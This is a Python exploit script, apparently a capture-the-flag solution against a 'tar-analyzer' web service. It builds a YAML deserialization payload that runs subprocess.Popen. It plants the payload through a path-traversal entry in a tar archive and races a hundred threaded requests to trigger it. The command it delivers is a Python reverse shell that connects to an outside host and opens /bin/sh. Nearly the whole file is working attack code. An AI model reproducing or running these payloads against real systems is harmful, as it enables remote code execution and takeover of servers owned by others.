import requests
import threading
import time
import pickle
import base64
import jsonpickle
import yaml
import subprocess
import tarfile
from copy import deepcopy

class Gen(object):
    def __init__(self, payload):
        self.payload = payload
    def __reduce__(self):
        return subprocess.Popen, (self.payload,)

class Payload(object):
    def __init__(self, cmd):
        self.filename = 'config.yaml'
        self.cmd = cmd
        self.payload = b''
    
    def yaml_payload(self):
        if "\'" in self.cmd or "\"" in self.cmd:
            self.payload = base64.b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gcHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJw==") + base64.b64encode(bytes(self.cmd, 'utf-8')) + base64.b64decode("JykuZGVjb2RlKCkpKSI=")
        else:
            self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
        self.save_tarfile()

    def save_tarfile(self):
        open("../../"+self.filename, "wb").write(self.payload)
        fp = tarfile.open(".COMMAND", "w")
        fp.add("../.././config.yaml")
        fp.close()

def overwrite_ip() :
    headers = {
        "Host": "tar-analyzer.ctf.defenit.kr:8080",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://tar-analyzer.ctf.defenit.kr:8080",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarykaXkmu40pOE2HHtI",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2"
    }
    requests.post("http://tar-analyzer.ctf.defenit.kr:8080/analyze", headers=headers, data=overwrite_ip_data)
    #print("overwrite admin ip!", flush=True)

def overwrite_command() :
    headers = {
        "Host": "tar-analyzer.ctf.defenit.kr:8080",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://tar-analyzer.ctf.defenit.kr:8080",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLYTyAuNetbeGL9cf",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2"
    }
    requests.post("http://tar-analyzer.ctf.defenit.kr:8080/analyze", headers=headers, data=cmd_data)
    #print("overwrite command!", flush=True)

def execute_command() :
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Host": "tar-analyzer.ctf.defenit.kr:8080",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
    }
    print(requests.get("http://tar-analyzer.ctf.defenit.kr:8080/admin", headers=headers).text)

def set_command(cmd) :
    payload = Payload(cmd)
    payload.yaml_payload()


overwrite_ip_data = open(".SET_ADMIN", "r").read()
overwrite_ip_data = base64.b64decode(overwrite_ip_data.encode()).decode()
cmd_data = b'------WebKitFormBoundaryLYTyAuNetbeGL9cf\r\nContent-Disposition: form-data; name="file"; filename=".COMMAND"\r\nContent-Type: application/octet-stream\r\n\r\n' + open(".COMMAND", "rb").read() + b'\r\n------WebKitFormBoundaryLYTyAuNetbeGL9cf--\r\n'
cmd_data = cmd_data.decode()


my_host = 'withphp.com'
my_port = 8080
reverse_shell = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);""".format(my_host, my_port)

set_command("python3 -c \"%s\""%(reverse_shell))

th1, th2, th3 = [], [], []

for i in range(100) :
    th1.append(threading.Thread(target=overwrite_ip, args=()))
    th2.append(threading.Thread(target=overwrite_command, args=()))
    th3.append(threading.Thread(target=execute_command, args=()))

for i in range(100) :
    th1[i].start()
    th2[i].start()
    th3[i].start()

